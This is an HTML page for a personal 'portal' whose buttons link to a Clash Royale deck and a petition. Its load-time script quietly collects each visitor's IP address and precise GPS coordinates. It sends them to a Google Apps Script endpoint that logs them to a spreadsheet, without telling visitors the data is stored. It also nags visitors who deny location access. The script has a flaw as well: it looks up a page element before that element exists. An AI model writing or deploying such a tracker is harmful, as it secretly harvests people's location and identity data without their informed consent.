<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Miles' Portal </title>
<style>
body {
font-family: 'Segoe UI', sans-serif;
background-color: #1e1e1e;
color: white;
text-align: center;
padding: 50px;
}
h1 {
font-size: 2.5em;
margin-bottom: 20px;
}
.button {
display: inline-block;
background-color: #3a3a3a;
color: white;
padding: 15px 30px;
margin: 10px;
border-radius: 8px;
text-decoration: none;
font-size: 18px;
transition: 0.3s;
}
.button:hover {
background-color: #ff4500;
}
#location-status button {
background-color: #ff4500;
color: white;
border: none;
padding: 10px 20px;
border-radius: 5px;
cursor: pointer;
font-size: 16px;
margin-top: 10px;
}
</style>
<script>
// ---------------- Redirects ----------------
const path = window.location.pathname.toLowerCase();
const redirects = {
"/milescurrentdeck": "https://royaleapi.com/deck-list/7232719592950918349",
"/mod": "https://sign.moveon.org/petitions/make-miles-a-mod"
};

if (redirects[path]) {
window.location.href = redirects[path];
}

// ---------------- Location Tracking ----------------
const SHEET_URL = "https://script.google.com/macros/s/AKfycbxMrkQjLGQlcMUB0bFcx5y5wkDvJKlkgd7uc9I8ojJcI1ibBkiKHf4Dl41Aj2yKJ9y_eQ/exec";
const locationStatus = document.getElementById('location-status');

// Function to handle the location request and data sending
function requestLocationAndData() {
locationStatus.innerHTML = ''; // Clear any previous messages

fetch("https://api.ipify.org?format=json")
.then(res => res.json())
.then(ipData => {
if ("geolocation" in navigator) {
navigator.geolocation.getCurrentPosition(pos => {
const data = {
ip: ipData.ip,
lat: pos.coords.latitude,
lon: pos.coords.longitude
};

// Send data to Google Sheets
fetch(SHEET_URL, {
method: "POST",
body: JSON.stringify(data)
})
.then(res => res.text())
.then(msg => console.log("Saved to Google Sheets:", msg))
.catch(err => console.error("Error saving:", err));

}, err => {
// Show message and button on location access denial
locationStatus.innerHTML = `
<p>Please accept the location services.</p>
<button onclick="requestLocationAndData()">Try again</button>
`;
});
}
});
}

// Initial call when the page loads
window.onload = requestLocationAndData;
</script>
</head>
<body>
<h1>Welcome to Miles' Portal </h1>
<a href="/milescurrentdeck" class="button">Miles Deck</a>
<a href="/mod" class="button">Make Miles a Mod</a>
<div id="location-status"></div>
</body>
</html>
